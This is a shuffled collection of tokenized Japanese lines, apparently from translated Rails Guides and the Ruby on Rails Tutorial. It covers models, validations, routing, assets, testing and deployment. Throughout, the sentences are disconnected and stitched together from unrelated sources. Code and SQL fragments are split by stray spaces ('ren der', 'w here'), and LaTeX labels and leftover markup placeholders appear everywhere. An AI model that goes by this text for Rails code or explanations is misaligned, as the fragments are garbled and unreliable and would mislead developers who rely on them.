まず は 、 第 \ ref { cha :static _ pages } 章 の 演習 で 取り上げ た Contact ページ に つ い て 追加 し ま しょ う 。
###  ジョブ を 作成 する
最後 の 機能 と し て 、 マイクロ ポストリソース に ポスト を 削除 する 機能 を 追加 し ま す 。
アセット へ の リンク で 使用 さ れ る プロトコル スキーム は 、 Web ページヘ の リクエスト 発生 時 に 、 その ページ へ の デフォルト の アクセス 方法 に 合わせ て 適切 に 生成 さ れ ま す 。
terabytes
テキスト エディタ か IDE を 使用 し て \ kode {app/models/micropost ▖ rb } を 開 き 、   { 1 } { 2 } リスト 2 ▖ 10 { / 2 } { / 1 } の 内容 に 置き換え ま す 。
たとえば 、 ` Book ▖find(:all ,   conditions : {  name :  '1984 '  }) ` は 非 推奨 で す ▟ 今後 は ` Book ▖ where ( name :  '1984 ' ) ` を ご 使用 くださ い 。
Rails に は 、 Java Script を さらに 使 い やす く し た Coffee Script が デフォルト で 組み込 ま れ て い ま す ▟ 以後 、 本 ガイド で は すべて の 例 を Coffee Script で 記述 し ま す 。
当然 ながら 、 既知 の バグ が 未 修正 の 状態 で あ れ ば 、 この テスト は パス する べ き で は あ り ま せ ん ▟ この 問題 を キャッチ する 、 失敗 する テスト を 追加 し ま しょ う 。
特定 の 属性 用 の input フィールド に 与え る ラベル を 返 し ま す 。
ログ 出力 を 無効 に する に は ` nil ` を 設定 し ま す 。
実 は 、 ハッシュ が 関数 呼び出し の \emph { 最後 の } 引数 で あ る 場合 は 、 波括弧 を 省略 でき ま す ▟ 以下 の 2 つ の 行 は 同等 で す 。
#   require   " sprockets/railtie "
SSL 攻撃 を 緩和 する ため に 、 ` form_authenticity _ token ` が マスク さ れ る よう に な り ま し た ▟ これ に よ り 、 この トークン は リクエスト ごと に 変更 さ れ ま す 。
       return false
この 作業 は ユーザー の edit ビュー で ユーザー を 更新 する   ( リスト \ ref{ code :user_edit_view})   の と 似 て い ま す が 、 今回 は パスワード 入力 フィールド と 確認 用 フィールド だけ を 使 い ま す 。
   self
シンボル と は ラベル で あ る ▟ 追加 的 な 構造 を 持 た な い   ( 代入 など が でき な い )   文字 列 みたい な もの 。
この 「 参照 が コピー さ れ る 」 動作 は 、 Ruby の オブジェクト の 複製 を 行 う とき に 多大 な 注意 を 払 わ な い と いけ な い こと を 意味 し ま す 。
    domain:               'example ▖ com' ,
Time▖ local ( 2000 ,   11 ,   31 ) ▖ next _ quarter  # =>  Wed ,   28   Feb   2001
``` ruby
さて 、 次 の 埋め込 み Ruby で は
   validates_associated : books
上記 に 対応 する ビュー は 以下 で す 。
= = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = =
o   = c▖orders▖ first
2 つ 目 の バリデーション で は 、 画像 の サイズ を 制御 し ま す ▟ これ は Micropost モデル に 書き足 し て い き ま す 。
###  Turbolinks の 動作 原理
Rails の インストール
\ href {https://www▖codeschool ▖ com/}{ Code   School } :   プログラミング を 対話 的 に 学習 でき る コース
たとえば 、 パーシャル 内 で `@products ` を レンダリング し た 回数 を ` product_counter ` 変数 で 参照 でき ま す 。
  $ rails server   --environment   production
     cattr_accessor   : last_ name ,   instance_ writer :  false
これ で ひと 安心 で す 。
これ は リスト \ ref{ code :user_ signin_test _valid _ information } で 使用 さ れ て い ま し た 。
図 \ ref { fig : profile_mockup_profile_name } の モックアップ に 近づけ る ため に 、 ユーザー の サイド バー の 最初 の バージョン を 作 り ま しょ う 。
_ 近年 に お け る Web アプリケーション へ の 攻撃 を 理解 する ため に 、 実際 の 攻撃 例 を ご 紹介 し ま す 。
空 の コレクション は デフォルト で は ゼロ を 返 し ま す が 、 この 動作 は カスタマイズ 可能 で す 。
パスワード 再 設定 用 フォーム の モックアップ
= >   [ 42 ,   8 ,   17 ,   7 ,   " foo " ,   " bar " ]
### `ordinal `
たとえば 、 注文   (order )   の 作成 日 の コレクション を 検索 し た い 場合 は 、 以下 の よう に し ま す 。
今度 は 、 新し い レコード を 作成 する とき に ' locked ' 属性 を ` false ` に 設定 し た い が 、 それ を クエリ に 含め た く な い と し ま す 。
class   Ad  <  ActiveRecord : : Base
デフォルト は ` 3 ` で す 。
仕上げ に 、 ユーザー 設定 の リンク に URL を 1 つ 追加 し て サイト 内 を 移動 でき る よう に し ま す 。
関連 付け の 両側 で この ヘルパー を 使用 する と 無限 ループ に な り ま す 。
デフォルト の フォーマット は ` :html ` な の で 、 Rails は HTML テンプレート を 探 し ま す 。
この 振る舞い は 、 \ kode { has\_many } メソッド に オプション を 渡 し て あげ る こと で 実装 でき ま す   ( リスト \ ref{ code :micropost_dependency } ) 。
SQL で 検索 する
述語 や フラグ で の 論理 値 の 表記 は 、 正確 な 値 表現 より も 、 論理 値 の 意味 を 優先 する こと 。
initializer " blorgh ▖ assets▖precompile "   do  | app |
コンソール は インタラクティブ Ruby   ( \kode {irb } )   上 に 構築 さ れ て い る ため 、 Ruby の 機能 を すべて 使 う こと が でき ま す
#   gem  'unicorn'
create  mode   100 6 44   Rakefile
# =>   重複 の な い 一意 の 名前 が 返 さ れ る
invoke     active_ record
HTML 構造 を 削除 し た Home ページ   GREEN { 2 } { 3 } { / 3 } { 3 } { 4 } { / 4 } { / 3 } { 3 } { / 3}{ / 2 }
その 一方 、 「 バグ 」 と 「 機能 」 の 線引き は そう 簡単 で は な い こと も あ り ま す 。
この コード は リスト \ ref{ code :title_tests } で 使用 さ れ て い ま し た ▟ もう ひと つ 、
### _ アセット _   の パス を 変更 する
ユーザー 登録 が 行 わ れ た とき に 、 有効 化 トークン と 、 それ に 対応 する 有効 化 ダイジェスト を 生成 する 。
これ は 、 \ kode {edit } アクション へ の 名前 付き ルート が 必要 に な る と い う こと で す 。
セッション の \ kode {new } アクション と ビュー を テスト する 。
*   アセット パイプライン
>>  JSON ▖ generate ( FooBar ▖ new,  quirks_mode :  true )  # => "\ " #< FooBar : 0 x 0 07 fa 80 a 481 6 10 >\ " "
修正 後 フォーム を 再 送信 する と 、 今度 は また し て も 「 a  template   is   mis sing 」 エラー が 表示 さ れ ま す 。
Rails アプリケーション の バージョン が 3 ▖ 1 より 前 の 場合 、 まず 3 ▖ 1 へ の アップグレード を 完了 し て から Rails   3 ▖ 2 へ の アップグレード に とりかか っ て くださ い 。
編集 用 の ビュー に 含 ま れ る フォーム は 、 記事 を 作成 する とき の ビュー に 含 ま れ る フォーム と 基本 的 に ほとんど 同じ で す 。
#   Require  the   gems  listed in   Gemfile ,   including  any  gems
実際 に や っ て み ま しょ う 。
画像 に 対 する バリデーション を 追加 する
` advance ` メソッド は 最初 に 月 を 進め 、 それ から 日 を 進め ま す ▟ それ に よ り 以下 の 結果 を 得 ま す 。
リファクタリング
* `:rel ` は リンク 内 の ` rel ` 値 を 指定 し ま す 。
     conflict    config/ routes▖rb
$  rackup  config▖ ru
この すべて を 実装 し た 結果 を 、 リスト \ ref{ code :relationships_controller_ following } に 示 し ま す 。
結果 と し て 、 \ ref{ sec :unicorn_in_production } で アプリケーション の デプロイ が 終わ る と 、 自動 的 に SSL が 有効 化 さ れ て い る はず で す ▟ ,   SSL   will   automatically  be enabled ▖
    resources  : comments ,   shallow :  true
###  ハッシュ キー が シンボル で も 文字 列 で も 同様 に 扱 う   ( indifferent   access )
` pluck ` は 、 1 つ の モデル で 使用 さ れ て い る テーブル から カラム   ( 1 つ で も 複数 で も 可 )   を 取得 する クエリ を 送信 する の に 使用 でき ま す 。
バリデーション メソッド を 実装 する に は 、 定義 済み の ` record ` パラメータ を 持 つ 必要 が あ り ま す ▟ この パラメータ は バリデーション を 行な う レコード で す 。
|   DELETE     | / geocoder      |  geocoders# destroy |  geocoder リソース を 削除 する                   |
次 に 、 図 \ ref { fig : failed_ signin_flash_ 3rd _edition } と 図 \ ref { fig : flash_persistence _ 3rd _edition } の 手順 を テスト コード で 再現 する 必要 が あ り ま す 。
Article▖any?
create      app/views/blorgh/articles/index▖html ▖erb
    mattr_accessor   : autoloaded_constants
この 式 を 指定 する に は 、 単に lock オプション の 引数 に し ま す 。
{ 0 } Figure   1 ▖ 11 :   {/ 0 } { 1 } A  schematic   representation   of  the   model- view-controller   ( MVC )   architecture▖ { / 1 }
assemblies▖empty?
REST   API
{ 0 } 表 6 ▖ 1 { / 0 }   { 1 } メール の 正規 表現 を 分解 し た 結果 { / 1 }
  end
名前 の 衝突 の 例 と し て 、 ヘルパー を 取り上げ ま しょ う 。
最初 に 、 \ kode {div } タグ の CSS   class   が   “ pagination ” に な っ て い る こと を テスト し ま す ▟ これ は \ texttt { will _ paginate } に よ っ て 出力 さ れ ま す 。
次 に 、 以下 の RSpec リクエスト spec   ( 結合 テスト )   を 見 て み ま しょ う 。
    @target▖blank ?  
` w here ` オプション で ハッシュ を 使用 し た 場合 、 この 関連 付け で 作成 さ れ た レコード は 自動 的 に この ハッシュ を 使用 し た スコープ に 含 ま れ る よう に な り ま す 。
読み取り 専用 オブジェクト
上 の コード で は 、 \ kode { users } テーブル の \ kode {email } カラム に インデックス を 追加 する ため に \ kode { add \_ index } と い う Rails の メソッド を 使 っ て い ま す 。
エラー メッセージ が 正し く 表示 さ れ て い る か どう か に つ い て は 、 演習 と し て 残 し て お き ま す   ( \ ref{ sec : exercises_a_test _ for _ invalid _ submis sion } ) 。
`ren der ` で `:html ` オプション を 使用 する と 、 HTML 文字 列 を 直接 ブラウザ に 送信 する こと が でき ま す 。
#### ` class_attribute `
この とき 、 ` Comment ` モデル を 生成 する こと 、 integer 型 の ` article _ id ` カラム と text 型 の ` text ` カラム を 持 つ テーブル と 関連 付け る こと を 指示 し ま す 。
Article モデル ` app/models/article ▖ rb ` を 以下 の よう に 変更 し ま しょ う 。
#### field_set_tag
\ kode { text } フィールド と \ kode { password } フィールド に 文字 を 入力 し た 状態
*  `attachments` -  メール に ファイル を 添付 し ま す 。
   if @book ▖ update ( book _ params )
なお 、 2011 年 に は 、 Rails   コミュニティ へ の 高 い 貢献 が 認め られ て 、 \ href { http://rubyheroes▖ com/heroes}{ Ruby   Hero   Award }   を 受賞 し ま し た 。
前書き
いよいよ Relationship の 関連 付け の 核心 、 \ kode { following } と \ kode { followers } に 取りかか り ま す 。
同様 に 、 有効 な データ を 送信 する 操作 を シミュレート する に は 、  \kode {fill_ in } を 使用 し て 正し い ユーザー 情報 を 与え ま す 。
( エラー メッセージ の 詳細 に つ い て は \ ref{ sec : signup_error _messages } で 説明 し ま す ) 。
id = \ kode { 1 } の ユーザー を 表示 する ページ
\ kode {header } タグ の 内側 に は 2 つ の \ kode {div } タグ が あ り ま す 。
  >>  x   =   1
単純 な 変更 で あ れ ば これ で 十分 バック ポート でき ま す 。
HTTP の ヘッダー ブロック の 後ろ に は 2 つ の CRLF が 置 か れ て ヘッダー ブロック の 終了 を 示 し 、 その 後ろ に 実際 の データ ( 通常 は HTML ) が 置 か れ ま す 。
関連 付け られ た オブジェクト が 保存 さ れ る こと も あ り ま せ ん 。
_   たとえば 、 ユーザー を 特定 の ページ へ リダイレクト し て 戻 し た い と し ま す 。
Client ▖ w here ( 'locked' => true )
###  カスタム バリ データ
置き換え た 結果 を \ ref{ code :microposts_create_action } に 示 し ま す 。
    ( Not   Yet  Implemented )
JRuby 環境 で SQLite 3 を 採用 する 場合 、 ` config/ database▖yml ` の 記述 方法 は 少し 異な り ま す 。
( \emph { 注 : } この 時点 で は わざわざ 見 に 行 く ほど の 仕上がり で は あ り ま せ ん が ) 。
#### ` from ( position ) `
その 理由 に つ い て は { 0 } { 1 } 第 6 章 { / 1 } { / 0 } で 説明 し ま す ) 。
本 ガイド で は 、 Ruby   on   Rails の 開発 に 「 あなた 」 が 参加 する 方法 に つ い て 説明 し ま す 。
  #  first   created -> highest   priority ▖
ブラウザ で ページ を 再 読み込 み する と 、 フラッシュ メッセージ が 表示 さ れ な く な る
ブラウザ を 完全 に 終了 する と 、 期待 どおり アプリケーション の ログ イン ステータス が 消去 さ れ 、 再び ログ イン を 要求 さ れ る よう に な っ た こと を 確認 でき ま す 。
以下 の よう に もっと 簡潔 な 方法 で 記述 する こと も でき ま す 。
たとえば \ ref{ sec : remember_me } で は 、 ログ イン と ログ アウト 用 の ヘルパー メソッド を サンプル アプリケーション の すべて の コントローラ で 利用 でき る よう に し て い ま す 。
デフォルト は ` : css ` で す 。
config▖ action_dispatch▖ default _headers = {
デフォルト で は 、 Rails の アセット は プリ コンパイル 済み かつ 静的 な アセット と し て Web サーバー から 提供 さ れ る こと が 前提 に な っ て い ま す 。
=>  " aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa "
Michael   Hartl  ( マイケル ハートル )
      * `find_or_create_by _▖▖▖`    に 代え て ` find_or_create_by ( ▖▖▖) ` を 使用
*   Rails セキュリティ   [ メーリング リスト ] ( http://groups▖google▖ com/group/rubyonrails - security ) を 購読 し ま しょ う 。
    Ruby   console   for   yourapp ▖herokuapp▖ com
WARNING :   ある [ 長年 の 未 解決 バグ ] (https://github▖ com/rails/rails/issues/176 9 )   が 原因 で 、 ` form _ for ` で は 単数 形 リソース を 自動 的 に 扱え ま せ ん 。
resources   : users
*   FROM   " users "   WHERE   " users " ▖ " state "   =  'inactive'
<% = stylesheet_link_tag   " scaffold "  %>
** config/ routes▖rb * *
さらに 、 与え られ た パスワード を セキュア に 認証 でき る 機能 も 実装 し ま し た 。
テスト も パス する はず で す 。
####  Active   Record を テスト する
resources   : photos ,   controller :  'images'
この メソッド に は ` : remote ` オプション が あ り 、 以下 の よう に 使用 でき ま す 。
ここ まで の 作業 内容 を コミット し て い な い 場合 、 作業 の 区切り を つけ る ため に も コミット し ま しょ う 。
|                     |  226                | :im_used                          |
こう する こと で 、 binstub の 生成 が 終わ っ て から Bundler が 実行 さ れ ま す 。
 |  Ruby   on   Rails   Tutorial   Sample  App
* `: touch `
#   クライアント コード
` Comment `   モデル   ( app/models/ comment ▖ rb )   内 の コード に 既に 書 か れ て い た よう に 、 1 つ の 記事 に は 1 つ の コメント が 属 し て い ま す 。
プリ コンパイル 済み の アセット は ファイル システム 上 に 置 か れ 、 Web サーバー から 直接 クライアント に 提供 さ れ ま す 。
{ 0 } 図 12 ▖ 14 { / 0 }   { 1 } フォロー し て い る ユーザー 用 ページ の モックアップ { / 1 }
[ ] ▖prepend ( 10 )              # =>  [ 10 ]
    has _one   : account_ history
       xml ▖item  do
マイクロ ポスト の パーシャル に 削除 リンク を 追加 する
### ` reverse_order `
   class   Article <  ActiveRecord : : Base
確か に 空 文字 列 が 出力 さ れ ま し た ▟ 今度 は \emph {nil } に 対 し て メッセージ を \ kode { 連鎖   ( chain) }  し て 渡せ る こと を 確認 し ま す 。
invoke   erb
サンプル アプリケーション 用 の \ kode { Gemfile }
( リスト \ ref{ code : proposed _contact _ page } に は リスト \ ref{ code : base_title_test } の よう な 修正 は 行 わ れ て い な い の で 、 その まま コピペ し て も 動 き ま せ ん ) 。
The  view  for   the   Help  page   with   full   HTML   structure▖   { 2 } { 3 } { / 3 } { 3 } { 4 } red { / 4 } { / 3 } { 3 } { / 3}{ / 2 }
[ 1 ,   2 ,   3 ] ▖ in_groups_of ( 2 )  # =>  [ [ 1 ,   2 ] ,   [ 3 ,  nil ] ]
# =>   + 1 - 1 23 - 555 - 123 4
デフォルト 値 は ` true ` で す 。
現在 の メール の 実装 を テスト する  
つまり 、 以下 の コード は 、
代わり に 、 サイン イン に 失敗 し た とき に フラッシュ メッセージ を 表示 する こと に し ま す 。
( 詳細 な 文字 列 を 調べ る ため に \ ref{ sec : hashes_and_symbols } で 紹介 し た \ kode {inspect } メソッド を 使 っ て い ま す ▟ )
コール バック
\ kode {if} - \kode {else } 文 の 2 つ の 分岐 に 対 し て 、 それぞれ 異な る パーシャル を 使用 する よう に ホーム ページ を リファクタリング し て くださ い 。
最後 に 、 ` app/views ` ディレクトリ の 下 に は ` layouts ` フォルダ が あ り ま す ▟ ここ に は ` blorgh/application ▖html ▖erb ` と い う ファイル が 置 か れ ま す 。
create      app/views/blorgh/articles/edit▖html ▖erb
コントローラ は 、 場合 に よ っ て は すぐ に \emph{view}  ( ビュー )   を 生成 し て HTML を ブラウザ に 送 り返 し ま す 。
Rails は \ href { http://en ▖wikipedia ▖org/wiki / Sui _ generis } {\emph { 独特 } } で あ り 、   Ruby と は 切り離 し て 学習 する 必要 が あ り ま す 。
出力 例 :
#   See  https://help▖ github▖ com/articles/ignoring - files   for   more  about  ignoring ╼ # files ▖
    ren der   action :   " special _ show "   and   return
About
リスト \ ref{ code : generate_user_ model } で ユーザー 用 の fixture が 自動 的 に 生成 さ れ て い ま す が 、 メール アドレス が 一意 に な っ て い ま せ ん   ( リスト \ ref{ code : default _fixtures } ) 。
Micropost の 初期 テスト は User モデル の 初期 テスト   ( リスト \ ref{ code : name_presence_ test } )   と 似 て い ま す 。
Bootstrap フレームワーク を 使 う と 、 い い 感じ の デザイン を 素早 く 実装 でき る
この ディレクトリ 名 と ファイル 名 は 、 どちら も 重要 で す 。
上 の コード で は 、 { p 0 } で 導入 し た { 2 }error _messages{ / 2 } パーシャル を 再 利用 し て い ま す 。
create    app/helpers/welcome_helper▖ rb
     size▖zero ?
= > #< Proc : 0 x 0 07 fab938 d 0108 @ ( irb ) : 1   ( lambda ) >
>> Blorgh : : Article ▖find ( 1 )
図 \ ref { fig : proto _feed_mockup } の モックアップ で 示 し た よう な 、 ユーザー 自身 の ポスト を 含 む マイクロ ポスト の \ kode { フィード } が な い と 不便 で す
この 変更 は 、 ルーティング ファイル の \ kode { resources } 行 で 行 い ま す   ( リスト \ ref{ code : password _ resets_resource } ) 。
use   ActionDispatch : : Flash
この プロジェクト で 特に 新し い ワークス ペース を 作成 する 必要 は あ り ま せ ん ) 。
` has _one ` 関連 付け で は 以下 の オプション が サポート さ れ ま す 。
` : only ` オプション は 、 指定 さ れ た ルーティング だけ を 生成 する よう 指示 し ま す 。
self を 省略 し た 結果 を リスト \ ref{ code :micropost _ partial _ image_display } に 示 し ま す 。
検証 ( validation )
_user_objects   ( end ) ╼╼  %  section  user_ model   ( end ) ╼╼  \ section { ユーザー を 検証 する } %  ( fold) ╼  \ label{ sec :user_ validations }╼╼
  >> x * =   3
シンボル と 文字 列 どちら を 使用 し た 場合 に も 、 上 の コード は 以下 の よう に な り ま す 。
#   Checks  for  pending   migrations   before   tests  are   run▖
|-----------------------------------|--------------------------|
なお 、 \ kode {install } は 省略 可能 で す 。
*  `config▖ active_ record ▖table_name_prefix ` は 、 テーブル 名 の 冒頭 に グローバル に 追加 し た い 文字 列 を 指定 し ま す 。
これ で テスト に パス する はず で す 。
レイアウト の   “ Settings ”   リンク を 更新 する
これ は リスト \ ref{ code : gemfile_pg _gem } で 使用 さ れ て い ま し た 。
` link_to ` など の ヘルパー で も 、 完全 な ` url_ for ` 呼び出し の 代り に 単に オブジェクト を 渡 す こと が でき ま す 。
create      app/assets/javascripts/blorgh/ comments▖js
THE _ US - ER@ foo▖ bar▖org
      t ▖ references   :imageable ,   polymorphic :  true
図 \ ref { fig : signup _ form } の フォーム の HTML ソース
どの スコープ メソッド も 、 常 に ` ActiveRecord : : Relation ` オブジェクト を 返 し ま す ▟ この オブジェクト に 対 し て 、 別 の スコープ を 含 む 他 の メソッド 呼び出し を 行な う こと も でき ま す 。
{ 0 } リスト 2 ▖ 10 { / 0 } ╼╼ { 1 } マイクロ ポスト の 最大 文字 数 を 140 文字 に 制限 する ▟ { 2 } { / 2 }   { 3 } app/models/micropost ▖ rb { / 3} { / 1 }
###  テキスタイル インジェクション
d ▖ monday                      # =>  Mon ,   10   Sep  2012
* `load_config_ initializers` :   アプリケーション や railties や エンジン に 含 ま れ る ` config/initializers ` に あ る Ruby ファイル を すべて 読み込 み ま す 。
Client▖select(:id ,  : name ) ▖ map  { | c|  [ c ▖ id ,  c▖ name ]  }
Home ページ に 表示 さ れ て い る 1 ページ 目 の フィード を テスト し て くださ い 。
この とき 、 先ほど 定義 し た User モデル の 属性   ( 図 \ ref { fig :user_ model_ password_digest } )   に 対応 し た カラム が あ る こと に も 注目 し て お い て くださ い
どんな に 簡単 な リファクタリング で あ っ て も 、 \emph { この 手 の } 変更 は つい 忘れ て しま う もの で す ▟ テスト を きちんと 書 い て お け ば 、 この 種 の 見落とし を 検出 でき ま す 。
SELECT  *  FROM   clients   WHERE   ( clients ▖ id   IN   ( 1 , 10 ) )
` config▖ autoload _once_ paths ` の 配列 に 含 ま れ る 要素 は 、 次 で 説明 する ` autoload _ paths ` に も まったく 同じ よう に 含め て お く 必要 が あ り ま す 。
具体 的 に は 、 この メソッド は 与え られ た ペア から   _値_  に 応 じ て ノード を 作成 し ま す 。
パーシャル に 独自 の レイアウト を 適用 する こと が でき ま す 。
基本 的 に は リソース フル ルーティング を 使用 す べ き で は あ り ま す が 、 この よう な 単純 な ルーティング の 方 が 適 し て い る 箇所 も 多数 あ る はず で す 。
{ 0 } 図 2 ▖ 9 { / 0 }   { 1 } 2人 目 の ユーザー が 追加 さ れ た 一覧 ページ   ( \ href { http://local host : 3000 / users }{/ users }) { / 1 }
作成 し た コード を リスト \ ref{ code : log _ in_success } に 示 し ま す
╼╼  \ section { ユーザー を 更新 する } %  ( fold) ╼  \ label{ sec : updating _ users }╼╼
ローカライズ 版 の テンプレート が 見当た ら な い 場合 は 、 装飾 なし の バージョン が 使用 さ れ ま す 。
以下 の よう に 、 文字 に 対 し て も 範囲 を 使用 でき ま す 。
#   active_ record/associations ▖ rb
これ は リスト \ ref{ code : base_title_test } で 使用 さ れ て い ま し た 。
{ 0 } { 1 } 図 2 ▖ 10 { / 1 } { / 0 } の   [ Destroy ]   リンク を クリック する と ユーザー が 削除 さ れ 、 index ページ の ユーザー は 1人 だけ に な り ま す
mount  Blorgh : : Engine  => "/blorgh "
下部 の フォーム は ` Users Controller ` の ` create ` アクション を 呼び出 し ま す 。
この セクション で は 、 メイラー と ビュー の 作成 方法 を 手順 を 追 っ て 説明 し ま す 。
当然 ながら 、 Heroku は 本番 サイト 用 の プラットフォーム な の で 、 実行 さ れ る アプリケーション は すべて 本番 環境 と な り ま す 。
いずれ の 場合 も 、 表 \ ref{table : password_token_digest } の 認証 メソッド を 完了 し ま す 。
上 の コード は 動作 し ま す が 、 今 の まま で は \ kode {session } も \ kode {cookies } も それぞれ 2 回 使用 さ れ て しま い 、 無駄 で す 。
    has_many  : orders ,   inverse _of:  : customer
#### `find_ by `
####  コレクション を レンダリング する
       create     db /migrate/201303 0 5 2 217 14 _ create_users ▖ rb
デフォルト の エラー メッセージ は  _ " has  already  been taken " _  で す 。
      t ▖ belongs_to  : patient
パスワード の 長 さ が 6 文字 以上 で あ る こと を 検証 する テスト を 、 以下 の L リスト \ ref{ code : minimum _ password _length_test } に 示 し ま す 。
その 理由 は 、 ` Hash ` や `OrderedHash` 、 ` Process: : Status ` など の クラス で は 、 正し い JSON 表現 を 提供 する ため に 特別 な 処理 が 必要 に な る ため で す 。
24 ,   25 ,   26 ,   27 ,   28 ,   29 ,   30 ,   31 ,   32 ,   33 ,  34 ,   35 ,  36 ,   37 ,   38 ,   39 ,   40 ,   41 ,   42 ,
   name ▖ sub ( / Test $/, '') ▖ constantize
Turbolinks
バック エンド で の キューイング 作業 で は 、 操作 方法 以外 の こと を 気 に せ ず に 済 み ま す 。
bun dle  install
form タグ に ` data - remote= " true " ` と い う 属性 が 追加 さ れ て い る こと に ご 注目 くださ い 。
*   Active   Record モデル で さまざま な 計算 を 行 う
   validates : subdomain ,   exclusion : { in : % w ( w w w  us   ca  jp ) ,
具体 的 に は 、 ` demodulize` 、 `un derscore ` を 実行 し 、 末尾 に   " _ id "   を 追加 し ま す 。
  { " first _ name " = > " Rafael " ,   " created_at " = > " 2012 - 1 1 - 1 0   23 : 23 : 45 ▖ 281189 " } ,
エンジン は プラグ イン に な る こと も でき 、 プラグ イン が エンジン に な る こと も でき ま す 。
上 の コード が 動作 する に は 、 この \ kode { password _ reset_expired ? } メソッド を 定義 する 必要 が あ り ま す 。
Mac   OS   X や Windows を 使用 し て い る 場合 は 、 OS に Java Script ラン タイム を インストール し て くださ い 。
( 試し に エスケープ 処理 を 外 し て 、 HTML の ソース コード を 注意 深 く 調べ て くださ い ▟ マイクロ ポスト の 内容 が おかし い はず で す ▟ )
これ ら 特定 の メッセージ の 前 に は 、 大 文字 で 始ま る 属性 名 が 追加 さ れ ま す ▟ ` add ` メソッド は 、 メッセージ を 追加 し た い 属性 名 、 および メッセージ 自身 を 受け取 り ま す 。
Rails で オブジェクト が 有効 ( valid ) で あ る か どう か を 検証 する に は 、 ` valid ? ` メソッド を 使用 し ま す 。
* `ActiveSupport: : Deprecation ▖ behavior ` は 、 ` config▖ active_ support▖ deprecation ` に 対 する もう 一 つ の セッター で あ り 、 Rails の 非 推奨 警告 メッセージ の 表示 方法 を 設定 し ま す 。
この 時点 で は Ruby の 文法 に つ い て は 気 に する 必要 は あ り ま せ ん ▟ 第 \ ref { cha : rails_flavored _ruby } 章 で 詳し く 解説 し ま す 。
以下 の ルーティング を 例 に と っ て み ま しょ う 。
     class   Articles Controller
` belongs_to ` 関連 付け は 、 別 の モデル と の 間 に 1 対 1 の 関連 付け を 作成 し ま す 。
次 に 、 \ kode {bun dle  install } で Spork を インストール し ま す 。
$  git  log  master ▖ ▖
アセット パイプライン は 自動 的 に ERB を 評価 し ま す 。
最後 の 第 \ ref { cha :user_microposts } 章 と 第 \ ref { cha : following _ users } 章 で は 、 マイクロ ブログ 機能 と ソーシャル 機能 を 実装 し 、 実際 に 動作 する Web サイト を 完成 さ せ ま す 。
Client ▖ create_with ( locked :  false ) ▖ find_or_create_by ( first _ name : ' Andy ')
    sample  application ▖
C : : X " ,  true )   # => true
####  content_tag _ for
1 つ の 例 と し て 、 アプリケーション スタイル シート 用 の マニフェスト ファイル を 見 て み ま しょ う   ( リスト \ ref{ code :app_css_manifest } ) 。
umerate}╼╼    %  subsection  length_ validation   ( end ) ╼╼    \ subsection { フォーマット を 検証 する } %  ( fold) ╼    \ label{ sec : format_validation}╼╼
これ は   _ 正し く あ り ま せ ん _ 。
     class   Account <  ActiveRecord : : Base
\ kode { sign_in } 関数 の コード を もう いち どよく 見 て み て くださ い 。
SELECT  *  FROM   comments   WHERE   article _ id   =   10   ORDER   BY  name
Sass の mixin 機能 を 使 う と 、 CSS の ルール を まとめ たり 他 の 場所 で 再 利用 でき る よう な る
私 の お 気 に 入 り は Heroku で 、 Rails を 含 む Ruby   Web アプリ 用 の ホスティング プラットフォーム で す
例 と し て 、 以下 の よう な ビュー が あ る と し ま す 。
この メソッド の 動作 は ` ren der ` と 完全 に 同じ で あ り 、 出力 結果 を ブラウザ に 返 さ ず に 文字 列 を 返 す 点 だけ が 異な り ま す 。
` ActiveRecord : : Base ▖ lock _optimistically  =  false ` を 設定 する と この 動作 を オフ に でき ま す 。
上 を ログ インフォーム に 反映 し た コード を リスト \ ref{ code :remember_me_ checkbox } に 示 し ま す 。
結果 は 図 \ ref { fig: demo_micropost _ index } の よう に な る はず で す 。
-------
コメント は まだ 正常 に 表示 でき ま せ ん 。
####  二 重 レンダリング エラー を 避け る
     ハッシュ を 1 つ 指定 し て オプション を 追加 する こと も でき ま す 。
seconds_ since_ mid night
create   app/controllers/welcome_controller▖ rb
self を 省略 し た 結果 を リスト \ ref{ code : procfile } に 示 し ま す 。
上 の ルーティング は `/photos / A 12345 ` の よう な パス に は マッチ し ま す が 、 `/photos/ 893 ` に は マッチ し ま せ ん 。
# => < label  for = " name " > Name</ label>
これ は リスト \ ref{ code : signup _ form_html } で 使用 さ れ て い ま し た 。
Client▖ pluck(:id )
# =>  Mon ,   0 2   Aug  2010   23 : 15 : 17   + 0000
ところ で 、 \ kode { form }   タグ の 内側 で 次 の よう な HTML が 生成 さ れ て い た こと に も お 気 付き で しょ う か 。
これ は 、 アプリケーション の 内部 で 作成 さ れ た テーブル は エンジン の 内部 で 作成 さ れ た テーブル と は 異な る ため で す 。
| log / | アプリケーション の ログ ファイル が 置 か れ ま す 。
strip_links ( " < a   href = " http://rubyonrails ▖org " > Ruby   on   Rails </a> " )
記憶 トークン 用 の 最初 の テスト 。
( 第 \ ref { cha : sign_up } 章 で もっと 便利 な メソッド を 紹介 し ま す )
= = = = = = = = = = = = = = = = = = = =
HTTP リクエスト に レスポンス を 返 す もう 一 つ の 方法 は 、 ` redirect_to ` を 使用 する こと で す 。
p ▖errors [ : name ]
\ kode {bcrypt - ruby } を \ kode { Gemfile } に 追加 する 。
      ▖▖▖
#  in   spec/support/ and  its   subdirectories▖
Rails   4 ▖ 1 から I 18 n オプション ` enforce_ available_ locales ` が デフォルト で ` true ` に な り ま し た 。
= > [#<User   id :   1 ,   name :  " Michael   Hartl " ,  email :   " mhartl@example ▖ com " ,
Bootstrap   CSS を 追加 する
*   ( 変更 内容 の 要約 を 記入 し ま す )
本書 の 最初 の 版 で は \ kode {user ▖ following } と し て い ま し た が 、 結局 これ も 混乱 を 招 く こと に 気付 き ま し た 。
この よう に な っ て い る の は 、 エンジン の マイ グレーション は アプリケーション の 既存 の マイ グレーション が すべて 終わ っ て から 実行 する 必要 が あ る ため で す 。
\ kode {split } で 文字 列 を 区切 っ て 配列 に する とき に は デフォルト で 空白 が 使用 さ れ ま す が 、 以下 の よう に 他 の 文字 を 指定 し て 区切 る こと も でき ま す 。
`end _of_ hour ` メソッド は 、 その 時 の 最後 の 時点   ( hh: 59 : 59 )   の タイム スタンプ を 返 し ま す 。
ここ で 言 う 「 リソース 」 と は 、 記事 、 人 、 動物 など の よく 似 た オブジェクト 同士 が 集ま っ た もの を 指 し ま す 。
*  `create`
コントローラ は 、 ビュー で 生成 さ れ た HTML を 受け取 り 、 ブラウザ に 返 す
create    app/views/layouts/mailer▖html ▖erb
